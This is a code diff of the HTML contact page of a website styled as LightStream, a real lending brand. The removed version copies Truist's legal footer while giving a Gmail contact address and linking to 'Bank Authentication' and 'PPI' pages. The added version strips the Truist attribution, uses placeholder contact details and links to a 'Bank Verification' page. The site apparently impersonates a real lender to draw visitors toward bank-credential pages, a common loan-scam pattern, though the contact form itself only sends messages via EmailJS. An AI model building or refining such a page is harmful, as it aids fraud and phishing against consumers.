@@ -3,287 +3,305 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Us - LightStream</title>
+    <title>Contact Us - LightStream Financial Services</title>
+    
+    <!-- Security Headers -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    
+    <!-- Legal & Security Meta -->
+    <meta name="description" content="Contact LightStream Financial Services for loan inquiries, support, and customer service.">
+    <meta name="keywords" content="contact, customer service, loan support, financial services contact">
+    <meta name="author" content="LightStream Financial Services">
+    <meta name="robots" content="index, follow">
+    
+    <!-- Google Site Verification -->
+    <meta name="google-site-verification" content="s-OWmZgVmfmuSt4KnIAA-IpD61w3rw8cRCh8WdTxVmk" />
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
     <style>
         body {
-            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
+            background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 50%, #2563eb 100%);
             min-height: 100vh;
+            font-family: Arial, sans-serif;
         }
         .glass-effect {
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
-        .neon-glow {
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5), 0 0 40px rgba(255, 215, 0, 0.3);
-        }
-        .text-cool {
-            color: #ffa500;
-        }
-        .cool-button {
-            background: linear-gradient(45deg, #000000, #333333);
+        .btn-primary {
+            background: #3b82f6;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
         }
-        .cool-button:hover {
+        .btn-primary:hover {
+            background: #2563eb;
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
-        }
-        .cool-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-            transition: left 0.5s;
-        }
-        .cool-button:hover::before {
-            left: 100%;
-        }
-        .bg-cool {
-            background: rgba(0, 0, 0, 0.7);
-            border-color: #ffa500;
-            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
-        }
-        .bg-cool-card {
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
         }
     </style>
 </head>
-<body class="bg-black">
+<body class="bg-blue-900">
     <!-- Header Navigation -->
     <header class="glass-effect sticky top-0 z-50">
         <nav class="container mx-auto px-4 py-4">
             <div class="flex justify-between items-center">
-                <div class="flex items-center space-x-8">
                 <div class="flex items-center space-x-2">
-                    <!-- Professional Logo - Full Width -->
-                    <div class="relative">
-                        <img src="images/newlogo.png" alt="LightStream Logo" class="logo-img" style="height: 68px; width: auto; max-width: none !important; max-height: none !important; object-fit: contain; background: transparent !important; filter: brightness(0) invert(1);">
-                        <div class="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full border-2 border-white"></div>
-                    </div>
+                    <i class="fas fa-shield-alt text-white text-2xl"></i>
+                    <span class="text-white text-xl font-bold">LightStream</span>
                 </div>
-                    <div class="hidden md:flex space-x-6">
-                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
-                        <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
-                        <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
-                        <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
-                    </div>
-                </div>
-                <div class="hidden md:flex space-x-4">
-                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
-                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
-                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
-                </div>
-                <button class="md:hidden text-white" id="mobileMenuBtn">
-                    <i class="fas fa-bars text-2xl"></i>
-                </button>
-            </div>
-            <!-- Mobile Menu -->
-            <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
-                <div class="flex flex-col space-y-3">
-                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
-                    <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
-                    <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
-                    <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
-                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
-                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
-                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
+                <div class="hidden md:flex space-x-6">
+                    <a href="index.html" class="text-white hover:text-blue-300">Home</a>
+                    <a href="personal-loans.html" class="text-white hover:text-blue-300">Personal Loans</a>
+                    <a href="bank-verification.html" class="text-white hover:text-blue-300">Bank Verification</a>
+                    <a href="privacy-policy.html" class="text-white hover:text-blue-300">Privacy Policy</a>
+                    <a href="terms.html" class="text-white hover:text-blue-300">Terms & Conditions</a>
+                    <a href="contact.html" class="text-white hover:text-blue-300">Contact Us</a>
                 </div>
             </div>
         </nav>
     </header>
 
-    <!-- Contact Content -->
-    <div class="container mx-auto px-4 py-12">
-        <div class="text-center mb-12">
-            <h1 class="text-4xl font-bold text-white mb-4">Contact Us</h1>
-            <p class="text-gray-300 text-lg">Get in touch with our team for any questions or support</p>
-        </div>
+    <!-- Main Content -->
+    <section class="py-20">
+        <div class="container mx-auto px-4">
+            <div class="max-w-6xl mx-auto">
+                <div class="text-center mb-12">
+                    <h1 class="text-4xl font-bold text-white mb-4">Contact Us</h1>
+                    <p class="text-blue-200">We're here to help with your loan questions and support needs</p>
+                </div>
 
-        <div class="grid md:grid-cols-2 gap-8">
-            <!-- Contact Form -->
-            <div class="bg-cool-card rounded-lg p-8 border border-cool">
-                <h2 class="text-2xl font-bold text-white mb-6">Send us a Message</h2>
-                <form id="contactForm" class="space-y-4">
-                    <div>
-                        <label class="block text-gray-300 text-sm font-medium mb-2">Name *</label>
-                        <input type="text" id="name" name="name" required class="w-full px-4 py-3 bg-black/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-cool focus:ring-2 focus:ring-cool/20" placeholder="Your full name">
-                    </div>
-                    <div>
-                        <label class="block text-gray-300 text-sm font-medium mb-2">Email *</label>
-                        <input type="email" id="email" name="email" required class="w-full px-4 py-3 bg-black/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-cool focus:ring-2 focus:ring-cool/20" placeholder="your@email.com">
-                    </div>
-                    <div>
-                        <label class="block text-gray-300 text-sm font-medium mb-2">Phone</label>
-                        <input type="tel" id="phone" name="phone" class="w-full px-4 py-3 bg-black/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-cool focus:ring-2 focus:ring-cool/20" placeholder="(555) 123-4567">
-                    </div>
-                    <div>
-                        <label class="block text-gray-300 text-sm font-medium mb-2">Subject *</label>
-                        <select id="subject" name="subject" required class="w-full px-4 py-3 bg-black/50 border border-gray-600 rounded-lg text-white focus:outline-none focus:border-cool focus:ring-2 focus:ring-cool/20">
-                            <option value="">Select a topic</option>
-                            <option value="loan">Loan Application</option>
-                            <option value="support">Technical Support</option>
-                            <option value="billing">Billing Question</option>
-                            <option value="other">Other</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label class="block text-gray-300 text-sm font-medium mb-2">Message *</label>
-                        <textarea id="message" name="message" required rows="4" class="w-full px-4 py-3 bg-black/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-cool focus:ring-2 focus:ring-cool/20" placeholder="Tell us how we can help..."></textarea>
-                    </div>
-                    <button type="submit" class="w-full bg-cool text-white py-3 rounded-lg font-semibold hover:bg-orange-600 transition duration-200">
-                        Send Message
-                    </button>
-                </form>
-            </div>
+                <div class="grid md:grid-cols-2 gap-8">
+                    <!-- Contact Form -->
+                    <div class="glass-effect rounded-lg shadow-xl p-8">
+                        <h2 class="text-2xl font-semibold text-white mb-6">Send us a Message</h2>
+                        
+                        <form id="contactForm" class="space-y-4">
+                            <div>
+                                <label class="block text-white text-sm font-bold mb-2" for="name">
+                                    Full Name *
+                                </label>
+                                <input type="text" id="name" name="name" required
+                                       class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                       placeholder="John Doe">
+                            </div>
+                            
 
-            <!-- Contact Information -->
-            <div class="space-y-6">
-                <div class="bg-cool-card rounded-lg p-8 border border-cool">
-                    <h2 class="text-2xl font-bold text-white mb-6">Get in Touch</h2>
-                    
+                            <div>
+                                <label class="block text-white text-sm font-bold mb-2" for="email">
+                                    Email Address *
+                                </label>
+                                <input type="email" id="email" name="email" required
+                                       class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                       placeholder="john.doe@example.com">
+                            </div>
+                            
+
+                            <div>
+                                <label class="block text-white text-sm font-bold mb-2" for="phone">
+                                    Phone Number
+                                </label>
+                                <input type="tel" id="phone" name="phone"
+                                       class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                       placeholder="(555) 123-4567">
+                            </div>
+                            
+
+                            <div>
+                                <label class="block text-white text-sm font-bold mb-2" for="subject">
+                                    Subject *
+                                </label>
+                                <select id="subject" name="subject" required
+                                        class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                                    <option value="">Select a subject</option>
+                                    <option value="loan-inquiry">Loan Inquiry</option>
+                                    <option value="application-status">Application Status</option>
+                                    <option value="payment-question">Payment Question</option>
+                                    <option value="technical-support">Technical Support</option>
+                                    <option value="complaint">Complaint</option>
+                                    <option value="other">Other</option>
+                                </select>
+                            </div>
+                            
+
+                            <div>
+                                <label class="block text-white text-sm font-bold mb-2" for="message">
+                                    Message *
+                                </label>
+                                <textarea id="message" name="message" rows="5" required
+                                          class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                          placeholder="How can we help you?"></textarea>
+                            </div>
+                            
+
+                            <button type="submit" class="btn-primary w-full">
+                                <i class="fas fa-paper-plane mr-2"></i>Send Message
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- Contact Information -->
                     <div class="space-y-6">
-                        <div class="flex items-start space-x-4">
-                            <div class="bg-cool text-white rounded-full w-12 h-12 flex items-center justify-center flex-shrink-0">
-                                <i class="fas fa-phone"></i>
-                            </div>
-                            <div>
-                                <h3 class="text-lg font-semibold text-white mb-1">Phone</h3>
-                                <p class="text-gray-300">+1(470)205-4983</p>
-                                <p class="text-gray-400 text-sm">Mon-Fri: 9AM-6PM EST</p>
+                        <!-- Company Information -->
+                        <div class="glass-effect rounded-lg shadow-xl p-8">
+                            <h2 class="text-2xl font-semibold text-white mb-6">Get in Touch</h2>
+                            
+
+                            <div class="space-y-4">
+                                <div class="flex items-start">
+                                    <i class="fas fa-building text-blue-400 text-xl mt-1 mr-4"></i>
+                                    <div>
+                                        <h3 class="text-lg font-semibold text-white mb-1">Company Name</h3>
+                                        <p class="text-blue-200">LightStream Financial Services</p>
+                                    </div>
+                                </div>
+                                
+
+                                <div class="flex items-start">
+                                    <i class="fas fa-map-marker-alt text-blue-400 text-xl mt-1 mr-4"></i>
+                                    <div>
+                                        <h3 class="text-lg font-semibold text-white mb-1">Physical Address</h3>
+                                        <p class="text-blue-200">123 Financial Street, Suite 100<br>New York, NY 10001<br>United States</p>
+                                    </div>
+                                </div>
+                                
+
+                                <div class="flex items-start">
+                                    <i class="fas fa-phone text-blue-400 text-xl mt-1 mr-4"></i>
+                                    <div>
+                                        <h3 class="text-lg font-semibold text-white mb-1">Phone</h3>
+                                        <p class="text-blue-200">1-800-LIGHTSTREAM<br>Mon-Fri: 9AM-6PM EST</p>
+                                    </div>
+                                </div>
+                                
+
+                                <div class="flex items-start">
+                                    <i class="fas fa-envelope text-blue-400 text-xl mt-1 mr-4"></i>
+                                    <div>
+                                        <h3 class="text-lg font-semibold text-white mb-1">Email</h3>
+                                        <p class="text-blue-200">info@lightstream.com<br>support@lightstream.com</p>
+                                    </div>
+                                </div>
                             </div>
                         </div>
 
-                        <div class="flex items-start space-x-4">
-                            <div class="bg-cool text-white rounded-full w-12 h-12 flex items-center justify-center flex-shrink-0">
-                                <i class="fas fa-envelope"></i>
-                            </div>
-                            <div>
-                                <h3 class="text-lg font-semibold text-white mb-1">Email</h3>
-                                <p class="text-gray-300">lightstreamloanservices@gmail.com</p>
-                                <p class="text-gray-400 text-sm">We respond within 24 hours</p>
+                        <!-- Business Hours -->
+                        <div class="glass-effect rounded-lg shadow-xl p-8">
+                            <h2 class="text-2xl font-semibold text-white mb-6">Business Hours</h2>
+                            
+
+                            <div class="space-y-2 text-blue-200">
+                                <div class="flex justify-between">
+                                    <span>Monday - Friday</span>
+                                    <span>9:00 AM - 6:00 PM EST</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span>Saturday</span>
+                                    <span>10:00 AM - 2:00 PM EST</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span>Sunday</span>
+                                    <span>Closed</span>
+                                </div>
                             </div>
                         </div>
 
-                        <div class="flex items-start space-x-4">
-                            <div class="bg-cool text-white rounded-full w-12 h-12 flex items-center justify-center flex-shrink-0">
-                                <i class="fas fa-map-marker-alt"></i>
-                            </div>
-                            <div>
-                                <h3 class="text-lg font-semibold text-white mb-1">Address</h3>
-                                <p class="text-gray-300">PO Box 117320</p>
-                                <p class="text-gray-300">Atlanta, GA 30368-7320</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="bg-cool-card rounded-lg p-8 border border-cool">
-                    <h3 class="text-xl font-semibold text-white mb-4">Business Hours</h3>
-                    <div class="space-y-3 text-gray-300">
-                        <div class="flex justify-between">
-                            <span>Monday - Friday</span>
-                            <span>9:00 AM - 6:00 PM</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span>Saturday</span>
-                            <span>10:00 AM - 4:00 PM</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span>Sunday</span>
-                            <span>Closed</span>
+                        <!-- Emergency Contact -->
+                        <div class="bg-yellow-600 bg-opacity-20 border border-yellow-500 rounded-lg p-6">
+                            <h3 class="text-lg font-semibold text-white mb-2">
+                                <i class="fas fa-exclamation-triangle mr-2"></i>Loan Processing Support
+                            </h3>
+                            <p class="text-sm text-yellow-200">
+                                For urgent loan application issues, please call our dedicated support line at 
+                                <strong>1-800-URGENT-LOAN</strong> during business hours.
+                            </p>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
-    </div>
+    </section>
 
-    <!-- Canonical Footer -->
-    <link rel="stylesheet" href="footer.css">
-    <!-- Canonical Footer Component - LightStream Website -->
-    <footer>
-        <div class="footer-container">
-            <!-- Footer Links Section -->
-            <div class="footer-links">
-                <a href="personal-loans.html">Personal Loans</a>
-                <a href="bank-auth.html">Bank Authentication</a>
-                <a href="faqs.html">FAQs</a>
-                <a href="#">Support</a>
-                <a href="contact.html">Contact Us</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Terms of Service</a>
-            </div>
-            
-            <!-- Footer Contact Section -->
-            <div class="footer-contact">
-                <!-- Social Media Icons -->
-                <div class="social-icons">
-                    <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
-                    <a href="#" aria-label="Facebook"><i class="fab fa-facebook"></i></a>
-                    <a href="#" aria-label="X"><i class="fab fa-x-twitter"></i></a>
-                    <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+    <!-- Footer -->
+    <footer class="bg-blue-950 text-white py-8">
+        <div class="container mx-auto px-4">
+            <div class="grid md:grid-cols-4 gap-8">
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">LightStream</h3>
+                    <p class="text-gray-400">Secure personal loan solutions for your financial needs.</p>
+                </div>
+                <div>
+                    <h4 class="text-lg font-semibold mb-4">Quick Links</h4>
+                    <ul class="space-y-2">
+                        <li><a href="index.html" class="text-gray-400 hover:text-white">Home</a></li>
+                        <li><a href="personal-loans.html" class="text-gray-400 hover:text-white">Personal Loans</a></li>
+                        <li><a href="bank-verification.html" class="text-gray-400 hover:text-white">Bank Verification</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-lg font-semibold mb-4">Legal</h4>
+                    <ul class="space-y-2">
+                        <li><a href="privacy-policy.html" class="text-gray-400 hover:text-white">Privacy Policy</a></li>
+                        <li><a href="terms.html" class="text-gray-400 hover:text-white">Terms & Conditions</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-lg font-semibold mb-4">Contact</h4>
+                    <ul class="space-y-2 text-gray-400">
+                        <li><i class="fas fa-envelope mr-2"></i>info@lightstream.com</li>
+                        <li><i class="fas fa-phone mr-2"></i>1-800-LIGHTSTREAM</li>
+                        <li><a href="contact.html" class="text-gray-400 hover:text-white">Contact Form</a></li>
+                    </ul>
                 </div>
             </div>
-            
-            <!-- Footer Legal Section -->
-            <div class="footer-legal">
-                <p><strong>Your loan terms, including APR, may differ based on loan purpose, amount, term length, and your credit profile.</strong> Lowest rates require excellent credit. At least 10.003% of approved applicants applying for to lowest rate qualified for to lowest rate available based on data from 10/01/2025 to 12/31/2025. Rate is quoted with AutoPay discount. AutoPay discount is only available prior to loan funding. Rates without AutoPay are 0.50% points higher. Subject to credit approval. Conditions and limitations apply. Advertised rates and terms are subject to change without notice.</p>
-                <p><strong>Payment example:</strong> Monthly payments for a $10,000 loan at 10.00% APR with a term of 3 years would result in 36 monthly payments of $306.44.</p>
-                <p><strong>Maximum APR for a LightStream loan is 25.39%.</strong> Loan terms range from 24 - 240 months depending on loan type.</p>
-                <p><strong>You can fund your loan today if today is a banking business day, your application is approved, and you complete the following steps by 2:30 p.m. Eastern time:</strong></p>
-                <ol>
-                    <li>review and electronically sign your loan agreement;</li>
-                    <li>provide us with your funding preferences and relevant banking information;</li>
-                    <li>complete final verification process.</li>
-                </ol>
-                <div class="footer-grid">
-                    <div class="footer-section">
-                        <h4>Business Hours (Eastern time)</h4>
-                        <p><strong>Customer Service</strong><br>
-                        Monday - Friday: 9:30 a.m. to 7 p.m. & Saturday: Noon to 4 p.m.</p>
-                        <p><strong>Application Processing</strong><br>
-                        Monday - Friday: 10 a.m. to 6 p.m.</p>
-                    </div>
-                    <div class="footer-section">
-                        <h4>Mailing Address</h4>
-                        <p>
-                            PO Box 117320<br>
-                            Atlanta, GA 30368-7320
-                        </p>
-                    </div>
-                </div>
-                <div class="legal-copyright">
-                    <p><strong>E H L Truist Bank is an Equal Housing Lender. © 2025 Truist Financial Corporation.</strong></p>
-                    <p>Truist, LightStream, and LightStream logos are service marks of Truist Financial Corporation. All rights reserved.</p>
-                    <p>All other trademarks are property of their respective owners. Lending services provided by Truist Bank.</p>
-                </div>
+            <div class="border-t border-blue-800 mt-8 pt-8 text-center text-gray-400">
+                <p>&copy; 2026 LightStream Financial Services. All rights reserved.</p>
             </div>
         </div>
     </footer>
 
     <script>
-        // Wait for DOM to be fully loaded
-        document.addEventListener('DOMContentLoaded', function() {
-            // Mobile menu toggle (matching personal-loans.html)
-            const mobileMenuBtn = document.getElementById('mobileMenuBtn');
-            const mobileMenu = document.getElementById('mobileMenu');
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("nW8qV4aakkEtYlieZ");
+        })();
 
-            if (mobileMenuBtn && mobileMenu) {
-                mobileMenuBtn.addEventListener('click', () => {
-                    mobileMenu.classList.toggle('hidden');
+        // Contact form submission
+        document.getElementById('contactForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const formData = {
+                name: document.getElementById('name').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                subject: document.getElementById('subject').value,
+                message: document.getElementById('message').value,
+                contactDate: new Date().toLocaleDateString()
+            };
+
+            // Send email
+            emailjs.send('service_mblpi2k', 'template_contact', formData)
+                .then(function(response) {
+                    alert('✅ Message sent successfully! We will respond within 24 hours.');
+                    document.getElementById('contactForm').reset();
+                })
+                .catch(function(error) {
+                    console.log('FAILED...', error);
+                    alert('❌ Error sending message. Please try again or call us directly.');
                 });
-            }
         });
     </script>
-    </body>
+</body>
 </html>
